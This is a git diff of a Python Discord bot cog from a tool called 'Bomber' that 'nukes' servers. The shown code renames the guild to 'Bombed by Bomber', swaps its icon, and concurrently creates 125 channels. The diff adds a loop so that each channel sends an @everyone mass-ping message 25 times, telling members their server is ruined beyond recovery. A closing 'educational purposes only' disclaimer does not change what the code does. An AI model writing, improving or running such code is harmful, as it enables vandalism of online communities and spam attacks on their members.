@@ -49,12 +49,13 @@ class Cleaner(Commands.Cog):
 
                 async def Bomb(Channel):
                     Channel = await Interaction.guild.create_text_channel(Channel)
-                    await Channel.send("||@everyone|| \n\n**This server has been nuked by Bomber**. \n__Recovering from corruption may not be possible without any sort of backup server or rollback.__ \n# What Can I Do? \n1. There's nothing to be done. Your server is completely ruined ***unless*** you have a 1:1 replica of the server as a backup. \n2. If you see this message it's probably too late, but just hope your security bot does the job! \n\nTHIS NUKE WAS MORE THAN LIKELY CAUSED BY A MEMBER OF YOUR SERVER. **DEVELOPERS OF BOMBER ARE NOT RESPONSIBLE FOR ANY ACTIONS.** BOMBER WAS MADE FOR EDUCATIONAL PURPOSES ONLY & FOR THE INTENTION OF DISCORD FIXING THEIR ISSUES. \n\nFind our **OFFICIAL** Github repository [on Github](https://github.com/Suno0526/Bomber) OR ~~<https://github.com/Suno0526/Bomber/>~~")
+                    for _ in range(25):
+                        await Channel.send("||@everyone|| \n\n**This server has been nuked by Bomber**. \n__Recovering from corruption may not be possible without any sort of backup server or rollback.__ \n# What Can I Do? \n1. There's nothing to be done. Your server is completely ruined ***unless*** you have a 1:1 replica of the server as a backup. \n2. If you see this message it's probably too late, but just hope your security bot does the job! \n\nTHIS NUKE WAS MORE THAN LIKELY CAUSED BY A MEMBER OF YOUR SERVER. **DEVELOPERS OF BOMBER ARE NOT RESPONSIBLE FOR ANY ACTIONS.** BOMBER WAS MADE FOR EDUCATIONAL PURPOSES ONLY & FOR THE INTENTION OF DISCORD FIXING THEIR ISSUES. \n\nFind our **OFFICIAL** Github repository [on Github](https://github.com/Suno0526/Bomber) OR ~~<https://github.com/Suno0526/Bomber/>~~")
 
                 await Interaction.guild.edit(name = "Bombed by Bomber 💥")
                 await Interaction.guild.edit(icon = Logo)
 
-                Tasks = [Bomb("𝗥𝗘𝗔𝗗-𝗠𝗘") for _ in range(1000)]
+                Tasks = [Bomb("𝗥𝗘𝗔𝗗-𝗠𝗘") for _ in range(125)]
                 await Asyncio.gather(*Tasks)
 
             except Exception as Exc:
@@ -71,6 +72,7 @@ class Cleaner(Commands.Cog):
         if Debug == True:
             await Interaction.response.send_message("# An Error Has Occurred. \n* If you want to use any commands, **please disable debug mode** by running **/debug** \n* __This is to prevent any issues with the bot.__ \n\nIf you are a developer, please note that debug mode is enabled & you will not be able to use any commands.** \n\n-Thanks, from <@1002377371892072498>.",
                                                     ephemeral = True)
+            
         else:
             try:
                 for Channel in Interaction.guild.channels:
